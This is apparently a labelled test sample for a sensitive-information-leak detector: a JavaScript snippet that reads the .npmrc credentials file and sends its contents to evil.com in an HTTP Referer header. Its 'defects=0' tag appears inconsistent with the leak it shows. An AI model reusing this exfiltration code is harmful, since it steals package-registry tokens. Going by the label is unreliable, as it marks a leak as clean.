//{fact rule=sensitive-information-leak@v1.0 defects=0}

var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });

//{/fact}